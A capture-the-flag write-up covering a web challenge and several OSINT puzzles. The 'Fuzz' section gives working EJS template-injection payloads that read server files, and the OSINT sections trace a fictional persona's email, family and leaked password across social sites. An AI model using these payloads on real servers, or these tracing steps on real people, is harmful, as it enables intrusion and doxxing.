---
layout: page
title: "Sentinels CTF challenges"
---
## link
https://sentinelsofvigil.ctfd.io/team

## > Fuzz (Web, 150)
https://sentinelsofvigil-fuzz.chals.io

web fuzzing is testing various inputs for a web app and hoping to induce unwanted behaviour.

in this website, we are provided a text input. upon submitting the input, the app reflects the input.

using the payload `javascript <script>alert(1337)</script>` suggests XSS but nothing much can be done with that

using the payload `sql ' OR 1=1;--` or similar simply reflects the input as is with no errors thrown, suggesting no sqli vulnerability

next i attempted ssti using the jinja2 payload `jinja2{{7*7}}` but the input was again, simply reflected

i then did some googling and found the payload `{{<%[%'"}}%\.` on https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/, which managed to throw an error, 'Error: Could not find matching close tag for "<%".'

according to chatgpt this error comes from EJS (embedded javascript)

the payload `<%= require('fs').readdirSync('.') %>` yields an error
'ReferenceError: ejs:1 >> 1 Fuzzed <%= require('fs').readdirSync('.') %> require is not defined'

this suggests that the local environment doesn't have require, this can be circumvented by a payload like `<%= global.process.mainModule.require('fs').readdirSync('.') %>`, which lists all the contents of the source directory: 'Fuzzed Dockerfile,app.js,flag.txt,node_modules,package-lock.json,package.json'

we want to read flag.txt, this can be done using the payload `<%= this.constructor.constructor("return process.mainModule.require('fs').readFileSync('flag.txt', 'utf8')")() %>`

with that, we obtain the flag, 'SENTI{n0t_s0_r4nd0m_1npu7}'

## > Convo (OSINT, 350)
our objective is to uncover the location that the user is staying at

our clues:
- good view from the roof
- captivating city lights
- uniquely shaped roof
- expensive to stay at
- a two hour drive from Muar
- near somewhere with over 100 haute coutre pieces (i have no idea what this refers to)

using common sense, we can deduce that said location is singapore's marina bay sands
flag: SENTI{Marina_Bay_Sands} (probably, can't double check)

## > Work 1 (OSINT, 200)
we are provided the image of someone's brawl stars account

upon stealing my brawl stars addict friend's phone, we can track down their profile by sending them a friend request. within the profile is a link to the employee's twitter/X: @nomo reb rawl

a photo posted on the employee's twitter shows their github username: C-employee-number-one

visiting their profile on github.com, we can identify the boss' github account, 'boss-of-slacker'. we can check out their commit history. by entering .patch behind the commit link, we can view the commit's details, and find the boss' email: 'bigbosschan123@gmail.com'.

flag: SENTI{bigbosschan123@gmail.com}

## > Work 3 (OSINT, 200)
a post on the employee's twitter suggests the existence of a reddit account. 
another post suggests that they like to replace the spaces in their username with underscores, which is the reddit username format.
therefore, their username should be u/nomo_reb_rawl

by looking up their user on reddit, we can find a post on r/pcmasterrace where they mention the pc specs that they want to buy in a link to pcpartpicker.com.

from this, it can be found that the processor they want is the AMD Ryzen 7 7800X3D 4.2 GHz 8-Core Processor.

flag: SENTI{AMD Ryzen 7 7800X3D}

## > Work 4 (OSINT, 200)
a post on the boss' twitter suggests that the boss has an instagram. 

first we attempted to look up the boss' instagram via their email, but we didnt find anything meaningful

then we realised that if the boss' twitter account was called 'boss_work_acc', the boss' personal instagram account would be named in a similar fashion.

using this knowledge, we identified the boss' instagram account at the username 'boss_family_acc'

and we can identify his family members Zhilin (age 27), Linzong (age 11), Meilin (age 7)"

flag: SENTI{Meilin_Linzong_Zhilin}

## > Work 5 (OSINT, 250)
the employee 'pasted' their password somewhere.

this leads to the implication that they used a pastebin web service, such as pastebin.com

searching up the username NOMOREBRAWL on pastebin, we can find the employee's password, 'wasitacaroracatisaw'

flag: SENTI{wasitacaroracatisaw}

## > Vocaloid quiz (OSINT, 1000) -- why???
YOUNG GIRL A
IEVAN POLKKA
LAGTRAIN
ASHITE ASHITE ASHITE
MIHOYO
BUTCHER VANITY
AYASE
BUG
